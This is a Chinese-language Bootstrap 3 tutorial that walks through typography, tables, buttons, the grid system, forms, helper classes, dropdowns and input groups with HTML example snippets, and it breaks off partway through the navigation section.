http://v3.bootcss.com 什么是bootstrap？ Bootstrap是基于 HTML、CSS、JAVASCRIPT 的开源框架，它简洁、直观、强悍、灵活，使得 Web开发更加快捷， 用于开发响应式布局、移动设备优先的 WEB项目。 为什么使用 Bootstrap？ 跨设备 跨浏览器（chrome，IE9以上，Firefox，Safari，Opera…） 响应式布局 具有实用性强的组件 内置jquery插件 bootstrap的结构 主要分为三大核心模块：css、js、font 二、bootstrap排版样式 标题 从 h1 到 h6 12345678&lt;h1&gt;Bootstrap 排版&lt;/h1&gt; //36px&lt;h2&gt;Bootstrap 排版&lt;/h2&gt; //30px&lt;h3&gt;Bootstrap 排版&lt;/h3&gt; //24px&lt;h4&gt;Bootstrap 排版&lt;/h4&gt; //18px&lt;h5&gt;Bootstrap 排版&lt;/h5&gt; //14px&lt;h6&gt;Bootstrap 排版&lt;/h6&gt; //12px&lt;h2&gt;bootstrap课程&lt;/h2&gt;&lt;p class=\"lead\"&gt;hello world&lt;/p&gt; 内联文本元素 添加标记，&lt;mark&gt;元素或.mark 类 1234567891011121314151617181920&lt;p&gt;Bootstrap&lt;mark&gt;排版&lt;/mark&gt;&lt;/p&gt;&lt;!--各种加线条的文本--&gt;&lt;del&gt;Bootstrap 排版&lt;/del&gt; //删除的文本&lt;s&gt;Bootstrap 排版&lt;/s&gt; //无用的文本&lt;ins&gt;Bootstrap 排版&lt;/ins&gt; //插入的文本&lt;u&gt;Bootstrap 排版&lt;/u&gt; //效果同上，下划线文本&lt;!--各种强调的文本--&gt;&lt;small&gt;Bootstrap 排版&lt;/small&gt; //标准字号的 85%&lt;strong&gt;Bootstrap 排版&lt;/strong&gt; //加粗 700&lt;em&gt;Bootstrap 排版&lt;/em&gt; //倾斜&lt;p class=\"text-left\"&gt;向左对齐文本&lt;/p&gt;&lt;p class=\"text-center\"&gt;居中对齐文本&lt;/p&gt;&lt;p class=\"text-right\"&gt;向右对齐文本&lt;/p&gt;&lt;p class=\"text-justify\"&gt;对齐文本。该段落会根据屏幕的大小对超出屏幕的文字进行换行&lt;/p&gt;&lt;p class=\"text-nowrap\"&gt;该段落不会根据屏幕的大小对超出屏幕的文字进行换行。&lt;/p&gt;&lt;p class=\"text-lowercase\"&gt;BOOTSTROP&lt;/p&gt;&lt;p class=\"text-uppercase\"&gt;bootstrap&lt;/p&gt;&lt;p class=\"text-capitalize\"&gt;bootstrap&lt;/p&gt; //单词首字母大写 缩略语 HTML元素提供了用于缩写的标记，比如 WWW 或 HTTP。Bootstrap 定义 &lt;abbr&gt; 元素的样式为显示在文本底部的一条虚线边框 当鼠标悬停在上面时会显示完整的文本（只要您为 &lt;abbr&gt; title 属性添加了文本）。为了得到一个更小字体的文本， 请添加 .initialism 到 &lt;abbr&gt; 12&lt;abbr title=\"World Wide Web\"&gt;WWW&lt;/abbr&gt;&lt;br&gt;&lt;abbr title=\"Real Simple Syndication\" class=\"initialism\"&gt;RSS&lt;/abbr&gt; 地址 address默认为 display:block;，需要使用标签来为封闭的地址文本添加换行 12345678910&lt;address&gt; &lt;strong&gt;Twitter, Inc.&lt;/strong&gt;&lt;br&gt; 795 Folsom Ave, Suite 600&lt;br&gt; San Francisco, CA 94107&lt;br&gt; &lt;abbr title=\"Phone\"&gt;P:&lt;/abbr&gt; (123) 456-7890&lt;/address&gt;&lt;address&gt; &lt;strong&gt;Full Name&lt;/strong&gt;&lt;br&gt; &lt;a href=\"mailto:#\"&gt;first.last@example.com&lt;/a&gt;&lt;/address&gt; 引用 默认样式引用，增加了左边线，设定了字体大小和内外边距&lt;blockquote&gt; Bootstrap 框架 &lt;/blockquote&gt; 反向&lt;blockquote class=&quot;blockquote-reverse &quot;&gt; Bootstrap 框架 &lt;/blockquote&gt; 多种引用样式 1234&lt;blockquote&gt; &lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante.&lt;/p&gt; &lt;footer class=\"text-right\"&gt;Someone famous in &lt;cite title=\"Source Title\"&gt;Source Title&lt;/cite&gt;&lt;/footer&gt;&lt;/blockquote&gt; 列表 有序列表、无序列表、自定义列表 .list-unstyled .list-inline .dl-horizontal 应用于&lt;dl&gt;元素和&lt;dt&gt;元素中 代码 .pre-scrollable 使 &lt;pre&gt; 元素可滚动 scrollable 内联代码 &lt;code&gt;&lt;section&gt;&lt;/code&gt; 用户输入 press &lt;kbd&gt;ctrl + ,&lt;/kbd&gt; 标记变量 &lt;var&gt;y&lt;/var&gt; = &lt;var&gt;m&lt;/var&gt;&lt;var&gt;x&lt;/var&gt; + &lt;var&gt;b&lt;/var&gt; 程序输出 &lt;samp&gt;This text is meant to be treated as sample output from a computer program.&lt;/samp&gt; 代码块 &lt;pre&gt;&lt;article&gt;Please input...&lt;/article&gt;&lt;/pre&gt; 三、表格、按钮、图片 表格 基本表格 &lt;table class=&quot;table&quot;&gt; 条纹表格 &lt;table class=&quot;table table-striped&quot;&gt; 边框表格 &lt;table class=&quot;table table-bordered&quot;&gt; 悬停表格&lt;table class=&quot;table table-hover&quot;&gt; 精简表格&lt;table class=&quot;table table-condensed&quot;&gt; 状态表格active、success、info、warning、danger 隐藏某一行&lt;tr class=&quot;sr-only&quot;&gt; 响应式表格 表格父元素设置响应式，小于 768px 出现边框&lt;div class=&quot;table-responsive&quot;&gt; 按钮 按钮标签 转化成普通按钮 &lt;a href=&quot;###&quot; class=&quot;btn btn-default&quot;&gt;Link&lt;/a&gt; &lt;button class=&quot;btn btn-default&quot;&gt;Button&lt;/button&gt; &lt;input type=&quot;button&quot; class=&quot;btn btn-default&quot; value=&quot;input&quot;&gt; 注意：为了跨浏览器展现，尽量使用button 按钮大小 .btn-lg 这会让按钮看起来比较大。 .btn-sm 这会让按钮看起来比较小。 .btn-xs 这会让按钮看起来特别小。 预定义样式 .btn-default 默认/标准按钮 .btn-primary 首选项样式 .btn-success 成功样式 .btn-info一般信息样式 .btn-warning 警告样式 .btn-danger 危险样式 .btn-link 链接样式 块级按钮 .btn-block 块级按钮(拉伸至父元素100%的宽度) 激活状态 &lt;button class=&quot;btn active&quot;&gt;Button&lt;/button&gt; 禁用状态 &lt;button class=&quot;btn active disabled&quot;&gt;Button&lt;/button&gt; 图片 .img-rounded 圆角 (IE8 不支持) .img-circle 圆形 (IE8 不支持) .img-thumbnail 缩略图功能 .img-responsive 图片响应式 (将很好地扩展到父元素) 四、栅格系统、表单 栅格系统 响应式网格系统随着屏幕或视口（viewport）尺寸的增加，系统会自动分为最多12列。 工作原理 行必须放置在.container(固定宽度)或者.container-fluid(100%宽度) class内，获得适当的对齐(alignment)和内边距(padding) 内容放置在列中，唯有列可以是行的直接子元素 预定义的网格类，比如 .row 和 .col-lg-4，可用于快速创建网格布局 列通过内边距（padding）来创建列内容之间的间隙 媒体查询 超小设备（手机，小于 768px） 没有任何媒体查询相关的代码，因为这在 Bootstrap 中是默认的（还记得 Bootstrap 是移动设备优先的吗？） 小型设备（平板电脑，大于等于768px）@media (min-width: @screen-sm-min) and (max-width: @screen-sm-max) { ... } 中型设备（台式电脑，大于等于992px）@media (min-width: @screen-md-min) and (max-width: @screen-md-max) { ... } 大型设备（大台式电脑，大于等于1200px）@media (min-width: @screen-lg-min) { ... } 栅格参数 超小屏幕 手机 (&lt;768px) 小屏幕 平板 (≥768px) 中等屏幕 桌面显示器 (≥992px) 大屏幕 大桌面显示器 (≥1200px) 栅格系统行为 总是水平排列 开始是堆叠在一起的，当大于这些阈值时将变为水平排列C .container 最大宽度 None（自动）750px 970px 1170px 类前缀 .col-xs- .col-sm- .col-md- .col-lg- 列（column）数 12 最大列（column）宽 自动 ~62px ~81px ~97px 间隙宽度 30px （每列左右均有 15px） 四种屏幕分类全部激活 12345678&lt;div class=\"container\"&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col-lg-3 col-md-4 col-sm-6 col-xs-12 a\"&gt;4&lt;/div&gt; &lt;div class=\"col-lg-3 col-md-4 col-sm-6 col-xs-12 a\"&gt;4&lt;/div&gt; &lt;div class=\"col-lg-3 col-md-4 col-sm-6 col-xs-12 a\"&gt;4&lt;/div&gt; .... &lt;/div&gt;&lt;/div&gt; 可以设置列偏移，让中间保持空隙 123456&lt;div class=\"container\"&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col-md-8\"&gt;1-8&lt;/div&gt; &lt;div class=\"col-md-3 col-md-offset-1\"&gt;10-12&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 可以嵌套，嵌满也是 12 列 123456789&lt;div class=\"container\"&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col-md-9\"&gt; &lt;div class=\"col-md-8\"&gt;1-8&lt;/div&gt; &lt;div class=\"col-md-4\"&gt;9-12&lt;/div&gt; &lt;/div&gt; &lt;div class=\"col-md-3\"&gt; 10-12 &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 可以把两个列交换位置，push 向右移动（推），pull 向左移动（拉） 123456&lt;div class=\"container\"&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col-md-8 col-md-push-4\"&gt;8&lt;/div&gt; &lt;div class=\"col-md-4 col-md-pull-8\"&gt;4&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 表单 垂直或基本表单 内联表单 让表单左对齐浮动，并表现为 inline-block内联块结构&lt;form class=&quot;form-inline&quot;&gt;注：当小于 768px，会恢复独占样式 水平表单 让表单内的元素保持水平排列 表单组合 前后增加片段12345&lt;div class=\"input-group\"&gt; &lt;div class=\"input-group-addon\"&gt;￥&lt;/div&gt; &lt;input type=\"text\" class=\"form-control\"&gt; &lt;div class=\"input-group-addon\"&gt;.00&lt;/div&gt;&lt;/div&gt; 输入框、文本域 原生的HTML5的input类型的支持 包括： text password datetime datetime-local date month time week number email url search tel color &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;文本输入&quot;&gt; &lt;textarea class=&quot;form-control&quot; rows=&quot;3&quot;&gt;&lt;/textarea&gt; 复选框（Checkbox）和单选框（Radio）123456789&lt;div class=\"checkbox\"&gt; &lt;label&gt;&lt;input type=\"checkbox\" value=\"\"&gt;选项 1&lt;/label&gt;&lt;/div&gt;&lt;div class=\"radio\"&gt; &lt;label&gt; &lt;input type=\"radio\" name=\"optionsRadios\" id=\"optionsRadios1\" value=\"option1\" checked&gt; 选项 1 &lt;/label&gt;&lt;/div&gt; 内联的复选框和单选框 123456&lt;label class=\"checkbox-inline\"&gt; &lt;input type=\"checkbox\" id=\"inlineCheckbox1\" value=\"option1\"&gt; 选项 1&lt;/label&gt;&lt;label class=\"radio-inline\"&gt; &lt;input type=\"radio\" id=\"optionsRadiosinline\" value=\"option1\"&gt; 选项 1&lt;/label&gt; 选择框 multiple多行显示 1234567&lt;select class=\"form-control\" multiple&gt; &lt;option&gt;1&lt;/option&gt; &lt;option&gt;2&lt;/option&gt; &lt;option&gt;3&lt;/option&gt; &lt;option&gt;4&lt;/option&gt; &lt;option&gt;5&lt;/option&gt;&lt;/select&gt; 静态控件 .form-control-static 表单控件状态 输入框焦点 当输入框 input 接收到:focus 时，输入框的轮廓会被移除，同时应用 box-shadow。 禁用的输入框 input 如果您想要禁用一个输入框 input，只需要简单地添加 disabled 属性，这不仅会禁用输入框，还会改变输入框的样式以及当鼠标的指针悬停在元素上时鼠标指针的样式。 禁用的字段集 fieldset 对 &lt;fieldset&gt; 添加 disabled 属性来禁用&lt;fieldset&gt; 内的所有控件。 校验状态 .has-warning、.has-error 或 .has-success 类到这些控件的父元素即可。 任何包含在此元素之内的 .control-label、.form-control 和 .help-block 元素都将接受这些校验状态的样式。 表单帮助文本 1234&lt;form role=\"form\"&gt; &lt;input class=\"form-control\" type=\"text\" placeholder=\"\"&gt; &lt;span class=\"help-block\"&gt;一个较长的帮助文本块，超过一行，需要扩展到下一行。本实例中的帮助文本总共有两行。&lt;/span&gt;&lt;/form&gt; 控件尺寸 .input-lg和col-lg-*来设置表单的高度和宽度1234567891011121314&lt;div class=\"form-group\"&gt; &lt;input class=\"form-control input-lg\" type=\"text\" placeholder=\"input-lg\"&gt;&lt;/div&gt;&lt;div class=\"row\"&gt; &lt;div class=\"col-lg-2\"&gt; &lt;input type=\"text\" class=\"form-control\" placeholder=\"col-lg-2\"&gt; &lt;/div&gt; &lt;div class=\"col-lg-3\"&gt; &lt;input type=\"text\" class=\"form-control\" placeholder=\"col-lg-3\"&gt; &lt;/div&gt; &lt;div class=\"col-lg-4\"&gt; &lt;input type=\"text\" class=\"form-control\" placeholder=\"col-lg-4\"&gt; &lt;/div&gt;&lt;/div&gt; 五、辅助类、响应式工具、菜单、图标 辅助类 文本 123456&lt;p class=\"text-muted\"&gt;本行内容是减弱的&lt;/p&gt;&lt;p class=\"text-primary\"&gt;本行内容带有一个 primary class&lt;/p&gt;&lt;p class=\"text-success\"&gt;本行内容带有一个 success class&lt;/p&gt;&lt;p class=\"text-info\"&gt;本行内容带有一个 info class&lt;/p&gt;&lt;p class=\"text-warning\"&gt;本行内容带有一个 warning class&lt;/p&gt;&lt;p class=\"text-danger\"&gt;本行内容带有一个 danger class&lt;/p&gt; 背景 12345&lt;p class=\"bg-primary\"&gt;bootstrap课程&lt;/p&gt;&lt;p class=\"bg-success\"&gt;bootstrap课程&lt;/p&gt;&lt;p class=\"bg-info\"&gt;bootstrap课程&lt;/p&gt;&lt;p class=\"bg-warning\"&gt;bootstrap课程&lt;/p&gt;&lt;p class=\"bg-danger\"&gt;bootstrap课程&lt;/p&gt; 关闭按钮 close 1&lt;button class=\"close\"&gt;×&lt;/button&gt; 下拉式菜单 caret 1&lt;span class=\"caret\"&gt;&lt;/span&gt; 浮动 pull-left pull-right 12&lt;div class=\"pull-left\"&gt;向左快速浮动&lt;/div&gt;&lt;div class=\"pull-right\"&gt;向右快速浮动&lt;/div&gt; 清除浮动 clearfix 1234&lt;div class=\"clearfix\" style=\"background: #D8D8D8;border: 1px solid #000;padding: 10px;\"&gt; &lt;div class=\"pull-left\" style=\"background:#58D3F7;\"&gt;向左快速浮动&lt;/div&gt; &lt;div class=\"pull-right\" style=\"background: #DA81F5;\"&gt;向右快速浮动&lt;/div&gt;&lt;/div&gt; 块级内容居中 center-block 12345&lt;div class=\"row\"&gt; &lt;div class=\"center-block\" style=\"width:200px;background-color:#ccc;\"&gt; 这是 center-block &lt;/div&gt;&lt;/div&gt; 显示、隐藏 show hide 12345678&lt;div class=\"row\" style=\"padding: 91px 100px 19px 50px;\"&gt; &lt;div class=\"show\" style=\"width:300px;background-color:#ccc;\"&gt; 这是 show class &lt;/div&gt; &lt;div class=\"hidden\" style=\"width:200px;background-color:#ccc;\"&gt; 这是 hide class &lt;/div&gt;&lt;/div&gt; 屏幕阅读器和键盘导航 .sr-only 来把元素对所有设备隐藏，除了屏幕阅读器 .sr-only-focusable 12345678910111213&lt;div class=\"row\" style=\"padding: 91px 100px 19px 50px;\"&gt; &lt;form class=\"form-inline\" role=\"form\"&gt; &lt;div class=\"form-group\"&gt; &lt;label class=\"sr-only\" for=\"email\"&gt;Email 地址&lt;/label&gt; &lt;input type=\"email\" class=\"form-control\" placeholder=\"Enter email\"&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label class=\"sr-only\" for=\"pass\"&gt;密码&lt;/label&gt; &lt;input type=\"password\" class=\"form-control\" placeholder=\"Password\"&gt; &lt;/div&gt; &lt;/form&gt;&lt;/div&gt;&lt;a class=\"sr-only sr-only-focusable\" href=\"#content\"&gt;Skip to main content&lt;/a&gt; 响应式工具 visible-xs visible-sm visible-md visible-lg hidden-xs hidden-sm hidden-md hidden-lg 以超小屏幕（xs）为例，可用的 .visible-*-* 类是：visible-xs-block、visible-xs-inline 和 visible-xs-inline-block visible-print-block visible-print-inline visible-print-inline-block 浏览器隐藏 打印机可见`hidden-print` 浏览器可见 打印机隐藏 `visible-print` 1234567891011121314151617181920&lt;div class=\"container\" style=\"padding: 40px;\"&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col-xs-6 col-sm-3\" style=\"background-color: #dedef8;border:1px solid #000;\"&gt; &lt;span class=\"hidden-xs\"&gt;特别小型&lt;/span&gt; &lt;span class=\"visible-xs\"&gt;✔ 在特别小型设备上可见&lt;/span&gt; &lt;/div&gt; &lt;div class=\"col-xs-6 col-sm-3\" style=\"background-color: #dedef8;border:1px solid #000;\"&gt; &lt;span class=\"hidden-sm\"&gt;小型&lt;/span&gt; &lt;span class=\"visible-sm\"&gt;✔ 在小型设备上可见&lt;/span&gt; &lt;/div&gt; &lt;div class=\"col-xs-6 col-sm-3\" style=\"background-color: #dedef8;border:1px solid #000;\"&gt; &lt;span class=\"hidden-md\"&gt;中型&lt;/span&gt; &lt;span class=\"visible-md\"&gt;✔ 在中型设备上可见&lt;/span&gt; &lt;/div&gt; &lt;div class=\"col-xs-6 col-sm-3\" style=\"background-color: #dedef8;border:1px solid #000;\"&gt; &lt;span class=\"hidden-lg\"&gt;大型&lt;/span&gt; &lt;span class=\"visible-lg\"&gt;✔ 在大型设备上可见&lt;/span&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 字体图标 用法：&lt;span class=&quot;glyphicon glyphicon-search&quot;&gt;&lt;/span&gt; 下拉菜单 基本的下拉菜单 123456789&lt;div class=\"dropdown\"&gt;&lt;button class=\"btn btn-default dropdown-toggle\" data-toggle=\"dropdown\"&gt;Dropdown &lt;span class=\"caret\"&gt;&lt;/span&gt;&lt;/button&gt;&lt;ul class=\"dropdown-menu\"&gt;&lt;li&gt;&lt;a href=\"\"&gt;Html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=\"\"&gt;Javascript&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=\"\"&gt;jQuery&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=\"\"&gt;html5+css3&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; 对齐 dropdown-menu-right 12345&lt;ul class=\"dropdown-menu\"&gt;...&lt;li class=\"dropdown-header\"&gt;Dropdown header&lt;/li&gt;...&lt;/ul&gt; 分隔线 12345&lt;ul class=\"dropdown-menu\"&gt;...&lt;li class=\"divider\"&gt;&lt;/li&gt;...&lt;/ul&gt; 禁用的菜单项 12345&lt;ul class=\"dropdown-menu\" aria-labelledby=\"dropdownMenu4\"&gt; &lt;li&gt;&lt;a href=\"#\"&gt;Regular link&lt;/a&gt;&lt;/li&gt; &lt;li class=\"disabled\"&gt;&lt;a href=\"#\"&gt;Disabled link&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;Another link&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt; 让菜单默认显示 &lt;div class=&quot;dropdown open&quot;&gt; 六、按钮、输入框组件 按钮组件 基本的按钮组 12345&lt;div class=\"btn-group\"&gt; &lt;button class=\"btn btn-default\"&gt;left&lt;/button&gt; &lt;button class=\"btn btn-default\"&gt;middle&lt;/button&gt; &lt;button class=\"btn btn-default\"&gt;right&lt;/button&gt;&lt;/div&gt; 按钮工具栏 123456789101112131415&lt;div class=\"btn-toolbar\"&gt; &lt;div class=\"btn-group\"&gt; &lt;button class=\"btn btn-default\"&gt;left&lt;/button&gt; &lt;button class=\"btn btn-default\"&gt;middle&lt;/button&gt; &lt;button class=\"btn btn-default\"&gt;right&lt;/button&gt; &lt;/div&gt; &lt;div class=\"btn-group\"&gt; &lt;button class=\"btn btn-default\"&gt;left&lt;/button&gt; &lt;button class=\"btn btn-default\"&gt;middle&lt;/button&gt; &lt;button class=\"btn btn-default\"&gt;right&lt;/button&gt; &lt;/div&gt; &lt;div class=\"btn-group\"&gt; &lt;button class=\"btn btn-default\"&gt;更多&lt;/button&gt; &lt;/div&gt;&lt;/div&gt; 按钮的大小 123456789101112131415&lt;div class=\"btn-group btn-group-lg\"&gt; &lt;button class=\"btn btn-default\"&gt;left&lt;/button&gt; &lt;button class=\"btn btn-default\"&gt;middle&lt;/button&gt; &lt;button class=\"btn btn-default\"&gt;right&lt;/button&gt;&lt;/div&gt;&lt;div class=\"btn-group btn-group-sm\"&gt; &lt;button class=\"btn btn-default\"&gt;left&lt;/button&gt; &lt;button class=\"btn btn-default\"&gt;middle&lt;/button&gt; &lt;button class=\"btn btn-default\"&gt;right&lt;/button&gt;&lt;/div&gt;&lt;div class=\"btn-group btn-group-xs\"&gt; &lt;button class=\"btn btn-default\"&gt;left&lt;/button&gt; &lt;button class=\"btn btn-default\"&gt;middle&lt;/button&gt; &lt;button class=\"btn btn-default\"&gt;right&lt;/button&gt;&lt;/div&gt; 嵌套 123456789101112&lt;div class=\"btn-group\"&gt; &lt;button class=\"btn btn-default\"&gt;left&lt;/button&gt; &lt;button class=\"btn btn-default\"&gt;middle&lt;/button&gt; &lt;div class=\"btn-group\"&gt; &lt;button class=\"btn btn-default dropdown-toggle\" data-toggle=\"dropdown\"&gt;按钮 &lt;span class=\"caret\"&gt;&lt;/span&gt;&lt;/button&gt; &lt;ul class=\"dropdown-menu\"&gt; &lt;li&gt;&lt;a href=\"\"&gt;1&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;2&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;3&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/div&gt; 垂直的按钮组 123456789101112&lt;div class=\"btn-group-vertical\"&gt; &lt;button class=\"btn btn-default\"&gt;left&lt;/button&gt; &lt;button class=\"btn btn-default\"&gt;middle&lt;/button&gt; &lt;div class=\"btn-group\"&gt; &lt;button class=\"btn btn-default dropdown-toggle\" data-toggle=\"dropdown\"&gt;按钮 &lt;span class=\"caret\"&gt;&lt;/span&gt;&lt;/button&gt; &lt;ul class=\"dropdown-menu\"&gt; &lt;li&gt;&lt;a href=\"\"&gt;1&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;2&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;3&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/div&gt; 两端对齐排列的按钮组 12345678910111213141516171819202122&lt;div class=\"btn-group btn-group-justified\"&gt; &lt;div class=\"btn-group\"&gt; &lt;button class=\"btn btn-default\"&gt;left&lt;/button&gt; &lt;/div&gt; &lt;div class=\"btn-group\"&gt; &lt;button class=\"btn btn-default\"&gt;middle&lt;/button&gt; &lt;/div&gt; &lt;div class=\"btn-group\"&gt; &lt;button class=\"btn btn-default\"&gt;right&lt;/button&gt; &lt;/div&gt;&lt;/div&gt;&lt;div class=\"btn-group btn-group-justified\"&gt; &lt;!--&lt;div class=\"btn-group\"&gt;--&gt; 为了浏览器兼容问题使用btn-group包裹 &lt;a href=\"\" class=\"btn btn-default\"&gt;left&lt;/a&gt; &lt;!--&lt;/div&gt;--&gt; &lt;!--&lt;div class=\"btn-group\"&gt;--&gt; &lt;a href=\"\" class=\"btn btn-default\"&gt;middle&lt;/a&gt; &lt;!--&lt;/div&gt;--&gt; &lt;!--&lt;div class=\"btn-group\"&gt;--&gt; &lt;a href=\"\" class=\"btn btn-default\"&gt;right&lt;/a&gt; &lt;!--&lt;/div&gt;--&gt;&lt;/div&gt; 按钮式下拉菜单 单按钮下拉菜单 btn-default btn-success btn-primary btn-info btn-danger btn-warning 12345678&lt;div class=\"btn-group\"&gt; &lt;button class=\"btn btn-default dropdown-toggle\" data-toggle=\"dropdown\"&gt;Default &lt;span class=\"caret\"&gt;&lt;/span&gt;&lt;/button&gt; &lt;ul class=\"dropdown-menu\"&gt; &lt;li&gt;&lt;a href=\"\"&gt;html&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;javascript&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;jQuery&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; 分裂式按钮下拉菜单 123456789&lt;div class=\"btn-group\"&gt; &lt;button class=\"btn btn-default\"&gt;Default&lt;/button&gt; &lt;button class=\"btn btn-default dropdown-toggle\" data-toggle=\"dropdown\"&gt;&lt;span class=\"caret\"&gt;&lt;/span&gt;&lt;/button&gt; &lt;ul class=\"dropdown-menu\"&gt; &lt;li&gt;&lt;a href=\"\"&gt;html&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;javascript&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;jQuery&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; 按钮下拉菜单的大小 btn-lg btn-sm btn-xs 12345678&lt;div class=\"btn-group\"&gt; &lt;button class=\"btn btn-default btn-lg dropdown-toggle\" data-toggle=\"dropdown\"&gt;Default &lt;span class=\"caret\"&gt;&lt;/span&gt;&lt;/button&gt; &lt;ul class=\"dropdown-menu\"&gt; &lt;li&gt;&lt;a href=\"\"&gt;html&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;javascript&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;jQuery&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; 向上弹出式菜单 dropup 12345678&lt;div class=\"btn-group dropup\"&gt; &lt;button class=\"btn btn-default btn-lg dropdown-toggle\" data-toggle=\"dropdown\"&gt;Default &lt;span class=\"caret\"&gt;&lt;/span&gt;&lt;/button&gt; &lt;ul class=\"dropdown-menu\"&gt; &lt;li&gt;&lt;a href=\"\"&gt;html&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;javascript&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;jQuery&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; 输入框 基本的输入框组 123456789101112131415&lt;form action=\"\"&gt; &lt;div class=\"input-group\"&gt; &lt;span class=\"input-group-addon\"&gt;@&lt;/span&gt; &lt;input type=\"text\" class=\"form-control\"/&gt; &lt;/div&gt; &lt;div class=\"input-group\"&gt; &lt;input type=\"text\" class=\"form-control\"/&gt; &lt;span class=\"input-group-addon\"&gt;.00&lt;/span&gt; &lt;/div&gt; &lt;div class=\"input-group\"&gt; &lt;span class=\"input-group-addon\"&gt;$&lt;/span&gt; &lt;input type=\"text\" class=\"form-control\"/&gt; &lt;span class=\"input-group-addon\"&gt;.00&lt;/span&gt; &lt;/div&gt;&lt;/form&gt; 输入框组的大小 input-group-lg input-group-xs input-group-sm 123456&lt;form action=\"\"&gt; &lt;div class=\"input-group input-group-lg\"&gt; &lt;span class=\"input-group-addon\"&gt;@&lt;/span&gt; &lt;input type=\"text\" class=\"form-control\"/&gt; &lt;/div&gt;&lt;/form&gt; 复选框和单选框插件 123456789101112&lt;form action=\"\"&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col-md-6\"&gt; &lt;div class=\"input-group\"&gt; &lt;span class=\"input-group-addon\"&gt; &lt;input type=\"checkbox\"/&gt; &lt;/span&gt; &lt;input type=\"text\" class=\"form-control\"/&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/form&gt; 按钮插件 input-group-btn 123456789101112&lt;form action=\"\"&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col-md-6\"&gt; &lt;div class=\"input-group\"&gt; &lt;span class=\"input-group-btn\"&gt; &lt;button class=\"btn btn-default\"&gt;Go&lt;/button&gt; &lt;/span&gt; &lt;input class=\"form-control\" type=\"text\"/&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/form&gt; 按钮式下拉菜单 1234567891011121314151617&lt;form action=\"\"&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col-md-6\"&gt; &lt;div class=\"input-group\"&gt; &lt;div class=\"input-group-btn\"&gt; &lt;button class=\"btn btn-default dropdown-toggle\" data-toggle=\"dropdown\"&gt;dropdown&lt;span class=\"caret\"&gt;&lt;/span&gt;&lt;/button&gt; &lt;ul class=\"dropdown-menu\"&gt; &lt;li&gt;&lt;a href=\"\"&gt;资讯&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;新闻&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;关于&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;input class=\"form-control\" type=\"text\"/&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/form&gt; 分裂式按钮下拉菜单 1234567891011121314151617181920&lt;form action=\"\"&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col-md-6\"&gt; &lt;div class=\"input-group\"&gt; &lt;div class=\"input-group-btn\"&gt; &lt;button class=\"btn btn-default\"&gt;dropdown&lt;/button&gt; &lt;button class=\"btn btn-default dropdown-toggle\" data-toggle=\"dropdown\"&gt; &lt;span class=\"caret\"&gt;&lt;/span&gt; &lt;/button&gt; &lt;ul class=\"dropdown-menu\"&gt; &lt;li&gt;&lt;a href=\"\"&gt;资讯&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;新闻&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;关于&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;input class=\"form-control\" type=\"text\"/&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/form&gt; 七、导航、导航条、面包屑导航组件 导航（标签） nav 标签页 nav-tabs 12345&lt;ul class=\"nav nav-tabs\"&gt; &lt;li class=\"active\"&gt;&lt;a href=\"\"&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a 